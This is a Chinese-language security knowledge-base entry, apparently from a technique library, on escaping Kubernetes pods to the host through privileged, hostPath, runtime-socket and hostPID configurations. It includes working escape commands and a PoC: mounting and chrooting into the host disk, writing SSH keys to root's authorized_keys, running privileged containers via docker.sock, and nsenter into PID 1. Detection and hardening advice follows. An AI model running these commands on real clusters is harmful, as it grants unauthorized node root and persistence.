---
id: cloud-container-k8s-workload-config-escape
title: K8s 危险工作负载配置逃逸宿主机（privileged/hostPath/hostPID）
type: scenario
domain: cloud
path: cloud/container
technique: k8s-workload-config-escape
aliases:
- K8s 容器逃逸
- privileged 逃逸
- hostPath 逃逸
- hostPID nsenter
- 危险 securityContext
tags:
- kubernetes
- container-escape
- privileged
- hostpath
- hostpid
- docker-sock
- capabilities
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:42:38+08:00'
  notes: 已对照原文核对；privileged/hostPath/hostPID/hostNetwork/CAP_SYS_ADMIN 识别与逃逸命令均与原文一致；原文无真实环境回显，未本地复现
---

## 一句话结论

当 Pod 被配置为 privileged、挂载宿主机根目录/容器运行时 socket、或启用 hostPID 时，容器内攻击者可以挂载宿主机磁盘并 chroot、通过 hostPath 直接读写宿主机文件、或 nsenter 进入宿主机命名空间，从而突破容器隔离拿到节点 root。

## 原理

- 容器隔离依赖 Linux namespace、cgroup、capabilities、seccomp/AppArmor 等机制；危险配置会主动削弱这些边界。
- `securityContext.privileged: true` 让容器获得几乎全部 capabilities 并放宽 seccomp/AppArmor，可直接 `fdisk -l` 看到宿主机磁盘、`mount` 宿主机分区、`chroot` 进入宿主机文件系统。
- `hostPath` 把宿主机目录挂进容器。挂载 `/` 等于直接读写宿主机所有文件；挂载 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 等于把容器运行时控制权交给容器，可创建新的特权容器并挂载宿主机根目录。
- `hostPID: true` 共享宿主机 PID 命名空间，容器内能看到宿主机所有进程；配合足够权限可用 `nsenter --target 1 ...` 进入宿主机 1 号进程的命名空间。
- `hostNetwork: true` 共享宿主机网络命名空间，可访问只监听 127.0.0.1 的宿主机服务（如 etcd），并可嗅探宿主机流量；它本身不直接逃逸，但常作为横向与凭据收集的放大器。
- `CAP_SYS_ADMIN` 等危险 capability 即使不是 privileged 也可能通过 mount/cgroup 机制逃逸，具体取决于内核版本与配置。

## 触发条件

- 已获得 Pod 内命令执行。
- Pod 配置存在以下任一：`privileged: true`、`hostPath` 挂载宿主机根目录或运行时 socket、`hostPID: true`、授予 `CAP_SYS_ADMIN` 等危险 capability。
- 内核与运行时未额外阻断（如 user namespace、seccomp 严格策略、只读挂载）。
- 对于 hostPID 逃逸，通常还需要 `CAP_SYS_ADMIN` 或 privileged 才能成功 nsenter。

## 利用步骤

1. 识别环境：`cat /proc/self/status | grep Cap`、`capsh --decode=<CapEff>`、`fdisk -l`、`mount`、`cat /proc/self/mountinfo`、`ps aux`、`ip addr`、`ss -lntup`。
2. 判断配置类型：
   - CapEff 接近全 1 或能看到宿主机磁盘 → privileged/高 capabilities；
   - 存在 `/host`、`/mnt` 等且能看到宿主机目录 → hostPath 根目录；
   - 存在 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` → 运行时 socket；
   - `ps aux` 看到宿主机 systemd/大量外部进程 → hostPID；
   - 网络接口与宿主机一致 → hostNetwork。
3. 按类型选择逃逸：
   - privileged：`fdisk -l` 找根分区 → `mount /dev/sdX /tmp/host` → `chroot /tmp/host /bin/bash`；
   - hostPath 根目录：直接通过挂载点读写 `/root/.ssh/authorized_keys`、`/etc/cron.d/` 等；
   - runtime socket：`docker -H unix:///var/run/docker.sock run -it --privileged -v /:/host alpine chroot /host /bin/bash`；
   - hostPID：`nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`。
4. 验证宿主机权限：读取 `/etc/shadow`、写入 SSH 公钥或计划任务、检查节点上的 kubeconfig/证书。
5. 以节点为跳板横向到其他节点或控制面。

## PoC

```bash
# 1) 识别
cat /proc/self/status | grep Cap
capsh --decode=000001ffffffffff
fdisk -l
mount | head
ps aux | head
ls -al /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null

# 2) privileged：挂载宿主机根分区并 chroot
mkdir -p /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash
# 写入 SSH 公钥
echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys

# 3) hostPath 根目录：直接写宿主机文件
echo 'ssh-rsa AAAA...' >> /host/root/.ssh/authorized_keys

# 4) runtime socket：创建新的特权容器
docker -H unix:///var/run/docker.sock run -it --privileged \
  -v /:/host alpine chroot /host /bin/bash

# 5) hostPID：进入宿主机 1 号进程命名空间
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

## 变体与关联

- `hostNetwork` 单独不逃逸，但可访问宿主机本地 etcd/管理端口、嗅探流量，常与其它配置组合。
- 危险 capabilities：`CAP_SYS_ADMIN` 可通过挂载 cgroup release_agent、宿主机设备等方式逃逸；`CAP_DAC_READ_SEARCH` 可读任意文件；具体利用取决于内核。
- 只读 hostPath 可先读凭据（kubeconfig、证书、SA Token），再寻找其他提权点。
- 关联：`[[cloud-k8s-k8s-rbac-clusterrolebinding-privesc]]` 与 `[[cloud-k8s-k8s-kubelet-unauth]]` 是获得 Pod 执行权的上游路径；`[[cloud-k8s-k8s-pod-sa-token-rbac-enumeration]]` 是逃逸前可先尝试的集群内提权路径。

## 检测与防御

- 检测：Pod 定义中出现 `privileged: true`、`hostPath`、`hostPID: true`、`hostNetwork: true`、`CAP_SYS_ADMIN`；可用 OPA/Kyverno/Pod Security Admission 做准入拦截与告警。
- 检测：容器内出现 `mount`、`chroot`、`nsenter`、`fdisk`、访问 `/dev/sd*`、写入 `/host` 等行为；运行时安全工具（Falco/Tetragon）可基于系统调用告警。
- 防御：禁止 privileged、hostPID、hostNetwork、宿主机根目录 hostPath；必须挂载时使用只读、最小目录、`readOnly: true`。
- 防御：不把 docker.sock/containerd.sock 挂进业务容器；使用 Pod Security Standards（restricted）或等价准入策略。
- 加固：drop 所有 capabilities 后按需 add；启用 seccomp/AppArmor；使用 user namespace；节点上限制容器运行时 socket 权限；定期审计工作负载配置。
